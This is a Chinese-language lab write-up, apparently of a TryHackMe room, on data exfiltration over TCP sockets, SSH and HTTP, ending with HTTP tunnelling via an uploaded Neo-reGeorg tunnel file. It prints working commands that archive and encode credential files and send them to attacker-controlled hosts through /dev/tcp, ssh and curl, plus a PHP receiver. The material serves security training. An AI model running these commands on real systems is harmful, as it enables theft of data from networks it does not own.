<h3 id="隧道技术">隧道技术</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009650.png" alt></p>
<p>在隧道场景中，攻击者使用这种数据泄露技术在受害者和攻击者的计算机之间建立通信通道。通信通道充当桥梁，让攻击者机器访问整个内部网络。建立连接时将持续发送和接收流量。</p>
<p>In the coming tasks, we will discuss the following techniques and use cases:<br>
在接下来的任务中，我们将讨论以下技术和用例：</p>
<ul>
<li>使用 TCP socket和 Base64 进行渗透</li>
<li>使用 SSH 进行渗透</li>
<li>使用 HTTPS 进行渗透（POST 请求）</li>
<li>ICMP</li>
<li>DNS</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009651.png" alt></p>
<h1 id="0x04-tcp-socket-进行渗透">0x04 TCP socket 进行渗透</h1>
<p>此任务展示如何使用数据编码通过 TCP 窃取数据。使用 TCP socket是攻击者在知道没有基于网络的安全产品的非安全环境中可能使用的数据泄露技术之一。如果我们处于安全良好的环境中，那么不建议进行这种渗透。这种渗透类型很容易检测，因为我们依赖非标准协议。</p>
<p>除了 TCP 套接字之外，我们还将使用各种其他技术，包括数据编码和归档。这项技术的好处之一是它在传输过程中对数据进行编码，使其更难以检查。</p>
<p>下图解释了 TCP 上的传统通信的工作原理。如果两台机器想要通信，那么其中一台必须侦听并等待传入​​流量。这类似于两个人交谈和交流的方式，其中一个人在听，另一个人在说话。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009652.png" alt></p>
<p>该图显示两台主机通过 TCP 在端口 1337 上进行通信，步骤如下：</p>
<ol>
<li>第一台机器正在通过 TCP 侦听端口 1337</li>
<li>另一台机器连接到步骤 1 中指定的端口。例如 nc 1.2.3.4 1337</li>
<li>第一台机器建立连接</li>
<li>最后开始发送和接收数据。例如，攻击者发送命令并接收结果。</li>
</ol>
<p>通过 TCP 的通信需要两台机器（一台受害者机器和一台攻击者机器）来传输数据。让我们使用我们的网络环境来练习通过 TCP 发送数据。为了通过 TCP 建立通信，我们需要两台机器：<a target="_blank" rel="noopener" href="http://victim1.thm.com">victim1.thm.com</a> 机器是受害者，而 JumpBox、<a target="_blank" rel="noopener" href="http://jump.thm.com">jump.thm.com</a> 是攻击者机器。</p>
<p>首先，我们需要在您指定的端口上的 JumpBox 上准备一个侦听器。在我们的例子中，我们选择端口 8080.</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ nc -lvp <span class="hljs-number">8080</span> &gt; /tmp/task4-creds.data
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">8080</span>)</code></pre>
<p>在上一个命令中，我们使用 nc 命令在端口 8080 上接收数据。然后，一旦接收到数据，我们将其存储在 /tmp/ 目录中，并将其命名为 task4-creds.data 作为文件名。</p>
<p>现在，让我们使用以下凭据连接到包含需要传输的数据的受害者计算机：thm:tryhackme。请注意，要从JumpBox连接到victim1，我们可以使用内部域名，如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ ssh thm<span class="hljs-keyword">@victim</span>1.thm.com</code></pre>
<p>我们还可以使用端口 2022 直接从 AttackBox 连接，如下所示：</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ssh thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -p <span class="hljs-number">2022</span></code></pre>
<p>我们已准备好在受害计算机上传输所需的数据。在本例中，我们有一个包含几个凭据的示例文件。</p>
<p>检查受害计算机上的 creds.txt 文件</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ cat task4/creds.txt 
<span class="hljs-attribute">admin</span>:password
<span class="hljs-attribute">Admin</span>:<span class="hljs-number">123456</span> 
<span class="hljs-attribute">root</span>:toor</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009653.png" alt></p>
<p>现在我们有了凭证文本文件，我们将使用 TCP 套接字来窃取它。确保侦听器正在 JumpBox 上运行。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:$ tar zcf - task4/ | base64 | dd conv=ebcdic &gt; /dev/tcp/<span class="hljs-number">192.168</span>.<span class="hljs-number">0.133</span>/<span class="hljs-number">8080</span>
<span class="hljs-number">0</span>+<span class="hljs-number">1</span> records in
<span class="hljs-number">0</span>+<span class="hljs-number">1</span> records out
<span class="hljs-number">260</span> bytes copied, <span class="hljs-number">9.8717</span>e-<span class="hljs-number">05</span> s, <span class="hljs-number">2.6</span> MB/s</code></pre>
<p>让我们分解前面的命令并解释它:</p>
<ol>
<li>我们使用 tar 命令创建一个存档文件，其中包含秘密目录内容的 zcf 参数。</li>
<li>z 用于使用 gzip 压缩所选文件夹，c 用于创建新存档，f 用于使用存档文件。</li>
<li>然后，我们将创建的 tar 文件传递​​给 Base64 命令，以将其转换为 Base64 表示形式。</li>
<li>然后，我们将base64命令的结果传递给使用EBCDIC编码数据的dd命令来创建和复制备份文件。</li>
<li>最后，我们重定向 dd 命令的输出，以使用指定 IP 和端口（在本例中为端口 8080）上的 TCP 套接字传输它。</li>
</ol>
<p>请注意，我们在渗透过程中使用了 Base64 和 EBCDIC 编码来保护数据。如果有人检查流量，它将采用非人类可读的格式，并且不会泄露传输的文件类型。</p>
<p>一旦我们按下回车键，我们应该会在 /tmp/ 目录中收到编码数据。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ nc -lvp <span class="hljs-number">8080</span> &gt; /tmp/task4-creds.data
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">8080</span>)
Connection from <span class="hljs-number">192.168</span>.<span class="hljs-number">0.101</span> received!

thm<span class="hljs-keyword">@jump-box</span>$ ls -l /tmp/
-rw-r--r-- <span class="hljs-number">1</span> root root       <span class="hljs-number">240</span> Apr  <span class="hljs-number">8</span> <span class="hljs-number">11</span>:<span class="hljs-number">37</span> task4-creds.data</code></pre>
<p>在JumpBox上，我们需要将接收到的数据转换回其原始状态。我们将使用 dd 工具将其转换回来。</p>
<p>恢复 tar 文件</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ cd /tmp/
thm<span class="hljs-keyword">@jump-box</span>:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d &gt; task4-creds.tar
<span class="hljs-number">0</span>+<span class="hljs-number">1</span> records in
<span class="hljs-number">0</span>+<span class="hljs-number">1</span> records out
<span class="hljs-number">260</span> bytes transferred in <span class="hljs-number">0.000321</span> secs (<span class="hljs-number">810192</span> bytes/sec)</code></pre>
<p>以下是对上一条命令的解释：</p>
<ol>
<li>我们使用 dd 命令将接收到的文件转换为 ASCII 表示形式。我们使用 task4-creds.data 作为 dd 命令的输入。</li>
<li>dd 命令的输出将传递到 base64 以使用 -d 参数进行解码。</li>
<li>最后，我们将输出保存在 task4-creds.tar 文件中。</li>
</ol>
<p>接下来，我们需要使用tar命令解压task4-creds.tar文件并检查内容如下：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ tar xvf task4-creds.tar
task4/ 
task4/creds.txt</code></pre>
<p>让我们分解前面的命令并解释它:</p>
<ol>
<li>我们使用 tar 命令使用 xvf 参数来解压缩文件。</li>
<li>x 用于提取 tar 文件，v 用于详细列出文件，f 用于使用存档文件。</li>
</ol>
<p>现在让我们确认我们从受害机器获得了相同的数据。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ cat task4/creds.txt
<span class="hljs-attribute">admin</span>:password
<span class="hljs-attribute">Admin</span>:<span class="hljs-number">123456</span>
<span class="hljs-attribute">root</span>:toor</code></pre>
<p>成功！在此任务中，我们使用 TCP 套接字将数据从受害者计算机窃取到攻击者计算机。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009654.png" alt></p>
<h1 id="0x05-ssh-进行渗透">0x05 SSH 进行渗透</h1>
<p>在此任务中，我们将展示如何使用 SSH 协议将数据泄露到攻击计算机。 SSH 协议建立了一个安全通道来在客户端和服务器之间交互和移动数据，因此所有通过网络或 Internet 传输的数据都是加密的。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009655.png" alt></p>
<p>要通过 SSH 传输数据，我们可以使用安全复制协议 SCP 或 SSH 客户端。假设我们没有可用于通过 SSH 传输数据的 SCP 命令。因此，在此任务中我们将更多地关注 SSH 客户端。</p>
<p>正如我们之前提到的，攻击者需要控制服务器（在本例中启用了 SSH 服务器）来接收泄露的数据。因此，在此场景中我们将使用 AttackBox 作为 SSH 服务器。您还可以使用 JumpBox，因为它启用了 SSH 服务器。</p>
<p>假设我们已经获得了对必须安全传输的敏感数据的访问权限。让我们连接到victim1 或victim2 机器。</p>
<p>需要传输的数据</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ cat task5/creds.txt
<span class="hljs-attribute">admin</span>:password
<span class="hljs-attribute">Admin</span>:<span class="hljs-number">123456</span>
<span class="hljs-attribute">root</span>:toor</code></pre>
<p>让我们使用我们在“使用 TCP 套接字进行渗透”任务中讨论的相同技术，其中我们将使用 tar 命令来归档数据，然后传输它。</p>
<p>从victim1机器中泄露数据</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:$ tar cf - task5/ | ssh thm<span class="hljs-keyword">@jump</span>.thm.com <span class="hljs-string">"cd /tmp/; tar xpf -"</span></code></pre>
<p>让我们分解前面的命令并解释它：</p>
<ol>
<li>我们和上一个任务一样使用tar命令创建task5目录的归档文件。</li>
<li>然后我们通过 ssh 传递存档文件。 SSH 客户端提供了一种无需完整会话即可执行单个命令的方法。</li>
<li>我们传递了必须在双引号中执行的命令“cd /tmp/; tar xpf”。在这种情况下，我们更改目录并取消归档传递的文件。</li>
</ol>
<p>如果我们检查攻击者的机器，我们可以看到我们已经成功传输了文件。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009656.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009657.png" alt></p>
<h1 id="0x06-https-进行渗透">0x06 HTTP(S) 进行渗透</h1>
<p>在进一步进行之前，请确保您在深入研究此任务和即将到来的任务之前具备网络协议的基础知识。</p>
<p>此任务说明如何使用 HTTP/HTTPS 协议将数据从受害者窃取到攻击者的计算机。作为此技术的要求，攻击者需要控制安装并启用服务器端编程语言的网络服务器。我们将在本任务中展示基于 PHP 的场景，但它可以用任何其他编程语言实现，例如 python、Golang、NodeJS 等。</p>
<h2 id="http-post-请求">HTTP POST 请求</h2>
<p>通过 HTTP 协议泄露数据是最好的选择之一，因为检测起来很困难。区分合法和恶意 HTTP 流量很困难。我们将在数据泄露中使用POST HTTP方法，原因是使用GET请求时，所有参数都会注册到日志文件中。使用 POST 请求时，则不然。以下是 POST 方法的一些优点：</p>
<ul>
<li>POST 请求永远不会被缓存</li>
<li>POST 请求不会保留在浏览器历史记录中</li>
<li>POST 请求无法添加书签</li>
<li>POST请求对数据长度没有限制</li>
</ul>
<p>让我们使用 thm:tryhackme 凭据登录到 <a target="_blank" rel="noopener" href="http://theweb.thm.com">theweb.thm.com</a> 计算机，并使用两个 HTTP 请求（一个用于 GET，另一个用于 POST）检查 Apache 日志文件，并检查它们的外观！</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:~$ ssh thm<span class="hljs-keyword">@web</span>.thm.com
thm<span class="hljs-keyword">@web-thm</span>:~$ sudo cat /var/log/apache2/access.log
[sudo] password for <span class="hljs-attribute">thm</span>:
<span class="hljs-number">10.10</span>.<span class="hljs-number">198.13</span> - - [<span class="hljs-number">22</span>/Apr/<span class="hljs-number">2022</span>:<span class="hljs-number">12</span>:<span class="hljs-number">03</span>:<span class="hljs-number">11</span> +<span class="hljs-number">0100</span>] <span class="hljs-string">"GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">147</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"curl/7.68.0"</span>
<span class="hljs-number">10.10</span>.<span class="hljs-number">198.13</span> - - [<span class="hljs-number">22</span>/Apr/<span class="hljs-number">2022</span>:<span class="hljs-number">12</span>:<span class="hljs-number">03</span>:<span class="hljs-number">25</span> +<span class="hljs-number">0100</span>] <span class="hljs-string">"POST /example.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">147</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"curl/7.68.0"</span></code></pre>
<p>显然，第一行是一个带有泄露数据的文件参数的 GET 请求。如果您尝试使用 based64 编码对其进行解码，您将获得传输的数据，在本例中为 thm:tryhackme。虽然第二个请求是对 example.php 的 POST，但我们发送了相同的 base64 数据，但它没有显示传输的数据。</p>
<p>access.log 中的 base64 数据看起来有所不同，不是吗？对其进行解码以找到下面问题 1 的标志。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009658.png" alt></p>
<p>在典型的现实场景中，攻击者控制互联网上某处云中的 Web 服务器。从受感染的计算机执行代理或命令，将受感染计算机网络外部的数据通过 Internet 发送到 Web 服务器。然后攻击者就可以登录Web服务器来获取数据，如下图所示。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009659.png" alt></p>
<h2 id="http-数据泄露">HTTP 数据泄露</h2>
<p>根据攻击者的配置，我们可以设置 HTTP 或 HTTPS（HTTP 的加密版本）。我们还需要一个 PHP 页面来处理发送到服务器的 POST HTTP 请求。</p>
<p>我们将在我们的场景中使用 HTTP 协议（​​而不是 HTTPS）。现在假设攻击者控制了 <a target="_blank" rel="noopener" href="http://web.thm.com">web.thm.com</a> 服务器，并且敏感数据必须从我们的网络 2 环境 (192.168.0.0/24) 中的 JumpBox <a target="_blank" rel="noopener" href="http://xn--victim1-gf7n.thm.com">或victim1.thm.com</a> 计算机发送。</p>
<p>要通过 HTTP 协议窃取数据，我们可以应用以下步骤：</p>
<ol>
<li>攻击者使用数据处理程序设置 Web 服务器。在我们的例子中，它将是 <a target="_blank" rel="noopener" href="http://web.thm.com">web.thm.com</a> 和 contact.php 页面作为数据处理程序。</li>
<li>C2 代理或攻击者发送数据。在我们的例子中，我们将使用curl命令发送数据。</li>
<li>网络服务器接收数据并存储它。在我们的例子中，contact.php 接收 POST 请求并将其存储到 /tmp 中。</li>
<li>攻击者登录网络服务器以获取收到的数据的副本。</li>
</ol>
<p>让我们遵循并应用我们在前面的步骤中讨论的内容。请记住，由于我们使用 HTTP 协议，因此数据将以明文形式发送。但是，我们将使用其他技术（tar 和 base64）来更改数据的字符串格式，使其不再是人类可读的格式！</p>
<p>首先，我们为此任务准备了一个带有数据处理程序的网络服务器。以下代码快照是 PHP 代码，用于通过文件参数处理 POST 请求，并将接收到的数据以 http.bs64 文件名存储在 /tmp 目录中。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>])) {
        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">"/tmp/http.bs64"</span>,<span class="hljs-string">"w"</span>);
        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>]);
        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);
   }
<span class="hljs-meta">?&gt;</span></code></pre>
<p>现在，从 Jump 计算机上，通过 SSH <a target="_blank" rel="noopener" href="http://xn--victim1-5t0ln11kto0g.thm.com">连接到victim1.thm.com</a> 计算机，以通过 HTTP 协议窃取所需的数据。使用以下 SSH 凭据：thm:tryhackme。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:~$ ssh thm<span class="hljs-keyword">@victim</span>1.thm.com</code></pre>
<p>您还可以使用端口 2022 从 AttackBox 连接到它，如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@attacker</span>$ ssh thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -p <span class="hljs-number">2022</span></code></pre>
<p>目标是通过 HTTP 协议将存储在 /home/thm/task6 中的文件夹内容传输到另一台计算机。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ ls -l
total <span class="hljs-number">12</span>
drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">19</span> <span class="hljs-number">19</span>:<span class="hljs-number">44</span> task4
drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">19</span> <span class="hljs-number">19</span>:<span class="hljs-number">44</span> task5
drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">19</span> <span class="hljs-number">19</span>:<span class="hljs-number">44</span> task6
drwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">4096</span> Jun <span class="hljs-number">19</span> <span class="hljs-number">19</span>:<span class="hljs-number">43</span> task9</code></pre>
<p>现在我们有了数据，我们将使用curl命令发送一个HTTP POST请求，其中包含秘密文件夹的内容，如下所示：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ curl --data <span class="hljs-string">"file=$(tar zcf - task6 | base64)"</span> <span class="hljs-attribute">http</span>://web.thm.com/contact.php</code></pre>
<p>我们使用带 --data 参数的curl 命令通过文件参数发送POST 请求。请注意，我们使用 tar 命令创建了秘密文件夹的存档文件。我们还将 tar 命令的输出转换为 Base64 表示形式。</p>
<p>接下来，从victim1或JumpBox机器上，<a target="_blank" rel="noopener" href="http://xn--web-7j2e7tk5p65ryrowx6a6rr0eb.thm.com">登录到网络服务器web.thm.com</a>，并检查/tmp目录是否已成功传输所需的数据。使用以下 SSH 凭据登录网络：thm:tryhackme.</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>1:~$ ssh thm<span class="hljs-keyword">@web</span>.thm.com 
thm<span class="hljs-keyword">@web</span>:~$ ls -l /tmp/
total <span class="hljs-number">4</span>
-rw-r--r-- <span class="hljs-number">1</span> www-data www-data <span class="hljs-number">247</span> Apr <span class="hljs-number">12</span> <span class="hljs-number">16</span>:<span class="hljs-number">03</span> http.bs64
thm<span class="hljs-keyword">@web</span>:~$ cat /tmp/http.bs64
H4sIAAAAAAAAA <span class="hljs-number">3</span>ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD&lt;
WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/<span class="hljs-number">8</span>ejzqlyrrDgF3Dr3
On/XLvI3QVshVY1hlv48/<span class="hljs-number">64</span>/<span class="hljs-number">7</span>I bU5fzJaa <span class="hljs-number">2</span>c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
<span class="hljs-number">5</span>gZKZxgrACgAAA==</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009660.png" alt></p>
<p>好的！我们已经收到了数据，但是如果您仔细查看 http.bs64 文件，您会发现它的 base64 已损坏。发生这种情况是由于 HTTP 上的 URL 编码所致。 + 符号已被替换为空格，因此让我们使用 sed 命令修复它，如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@web</span>:~$ sudo sed -i <span class="hljs-string">'s/ /+/g'</span> /tmp/http.bs64
#### <span class="hljs-number">1</span>. `sed`

`sed` 是一个流编辑器（stream editor），用于对文本文件进行基本的文本操作，如查找、替换、插入和删除等。

#### <span class="hljs-number">2</span>. `-i`

`-i` 选项表示就地（in-place）编辑文件。使用这个选项后，`sed` 会直接修改文件，而不是将结果输出到标准输出。

#### <span class="hljs-number">3</span>. `<span class="hljs-string">'s/ /+/g'</span>`

这是一个 `sed` 替换命令，格式为 `s/old/new/flags`。

- **`s`**：表示替换（substitute）。
- **`/ /`**：表示要查找的模式，这里是一个空格字符。
- **`/+/`**：表示替换的模式，这里是一个加号（`+`）。
- **`g`**：全局替换标志，表示替换行内所有符合模式的部分。如果省略 `g`，`sed` 只会替换每行第一个符合模式的部分。

综上所述，`<span class="hljs-string">'s/ /+/g'</span>` 的含义是将每行中的所有空格替换为加号。</code></pre>
<p>使用 sed 命令，我们将空格替换为 + 字符，使其成为有效的 Base64 字符串！</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@web-thm</span>:/tmp$ cat http.bs64 
H4sIAAAAAAAAA <span class="hljs-number">3</span>RPQ4CIRCGYeo9BSdQQGATO49CXAtjFAMYPb672G38qYgxvk8zDFDM5CshH/xS
NKVGvXO1jua1nrU1ziqle2 E0sorJ6RrO9bDJZeQpBQpxvLu36f3H1Vq/tu0G/Ki3NpsOAXsrX2d
v/Wz/I0dr6RqMs3Mn cfhuP tD6HnK8xDd2mttqsrPPdtPK6xJi6b08JAAAAAAAAAAAAAAAA4Jk7
FWUx0QAoAAA=thm<span class="hljs-keyword">@web-thm</span>:/tmp$ sudo sed -i <span class="hljs-string">'s/ /+/g'</span> http.bs64 
[sudo] password for <span class="hljs-attribute">thm</span>: 
thm<span class="hljs-keyword">@web-thm</span>:/tmp$ cat http.bs64 
H4sIAAAAAAAAA+<span class="hljs-number">3</span>RPQ4CIRCGYeo9BSdQQGATO49CXAtjFAMYPb672G38qYgxvk8zDFDM5CshH/xS
NKVGvXO1jua1nrU1ziqle2+E0sorJ6RrO9bDJZeQpBQpxvLu36f3H1Vq/tu0G/Ki3NpsOAXsrX2d
v/Wz/I0dr6RqMs3Mn+cfhuP+tD6HnK8xDd2mttqsrPPdtPK6xJi6b08JAAAAAAAAAAAAAAAA4Jk7</code></pre>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@web</span>:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
tmp/task6/
tmp/task6/creds.txt</code></pre>
<p>最后，我们使用带 -d 参数的 base64 命令对 base64 字符串进行解码，然后传递解码后的文件并使用 tar 命令将其取消归档。</p>
<h2 id="https-通讯">HTTPS 通讯</h2>
<p>在上一节中，我们展示了如何通过 HTTP 协议执行数据过滤，这意味着所有传输的数据都是明文形式。 HTTPS 的优点之一是使用服务器上存储的 SSL 密钥对传输的数据进行加密。</p>
<p>如果您应用我们之前在启用 SSL 的 Web 服务器上展示的相同技术，那么我们可以看到所有传输的数据都将被加密。我们已经设置了私有 HTTPS 服务器来显示传输的数据。如果您有兴趣设置自己的 HTTPS 服务器，我们建议您访问 <a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04">Digital Ocean</a> 网站</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009661.png" alt></p>
<p>如屏幕截图所示，我们捕获了网络流量，似乎端口 443 上的所有客户端和服务器通信都已加密。</p>
<h2 id="http-隧道">HTTP 隧道</h2>
<p>HTTP 协议隧道技术封装了其他协议并通过 HTTP 协议来回发送它们。 HTTP 隧道根据通信通道发送和接收许多 HTTP 请求！</p>
<p>在深入研究 HTTP 隧道细节之前，我们先讨论一个无法通过 Internet 访问许多内部计算机的典型场景。例如，在我们的场景中，<a target="_blank" rel="noopener" href="http://uploader.thm.com">uploader.thm.com</a> 服务器可通过 Internet 访问，并向每个人提供 Web 服务。但app.thm.com服务器运行在本地，只为内网提供服务，如下图所示：<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009662.png" alt></p>
<p>在本节中，我们将创建一个 HTTP 隧道通信通道，以进入内部网络并通过 HTTP 协议与本地网络设备进行通信。假设我们发现了一个网络应用程序，可以让我们将 HTTP 隧道代理文件上传到受害者网络服务器 <a target="_blank" rel="noopener" href="http://uploader.thm.com">uploader.thm.com</a>。上传并连接到它后，我们将能够与 <a target="_blank" rel="noopener" href="http://app.thm.com">app.thm.com</a> 进行通信。</p>
<p>对于 HTTP 隧道，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a> 工具建立通信通道来访问内部网络设备。我们已经在AttackBox中安装了该工具（我安装在kali上了）</p>
<p>接下来，我们需要生成一个加密的客户端文件并将其上传到受害者的 Web 服务器，如下所示：</p>
<pre><code class="hljs shell">root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&amp;  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$&lt;
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '&lt;@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       =&gt; neoreg_servers/tunnel.aspx
       =&gt; neoreg_servers/tunnel.ashx
       =&gt; neoreg_servers/tunnel.jsp
       =&gt; neoreg_servers/tunnel_compatibility.jsp
       =&gt; neoreg_servers/tunnel.jspx
       =&gt; neoreg_servers/tunnel_compatibility.jspx
       =&gt; neoreg_servers/tunnel.php</code></pre>
<p>前面的命令使用 neoreg_servers/ 目录中的 thm 密钥生成加密的隧道客户端。请注意，有各种可用的扩展，包括 PHP、ASPX、JSP 等。在我们的场景中，我们将通过上传器计算机上传tunnel.php 文件。要访问上传器机器，您可以访问以下 URL：<a target="_blank" rel="noopener" href="http://10.10.41.88/uploader">http://10.10.41.88/uploader</a> 或 <a target="_blank" rel="noopener" href="https://10-10-41-88.p.thmlabs.com/uploader%EF%BC%8C%E6%97%A0%E9%9C%80">https://10-10-41-88.p.thmlabs.com/uploader，无需</a> VPN<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009663.png" alt></p>
<p>要上传 PHP 文件，请使用 admin 作为密钥，以便您将任何文件上传到 <a target="_blank" rel="noopener" href="http://uploader.thm.com">uploader.thm.com</a>。上传文件后，我们可以通过以下 URL 访问它：<a target="_blank" rel="noopener" href="http://10.10.41.88/uploader/files/tunnel.php">http://10.10.41.88/uploader/files/tunnel.php</a></p>
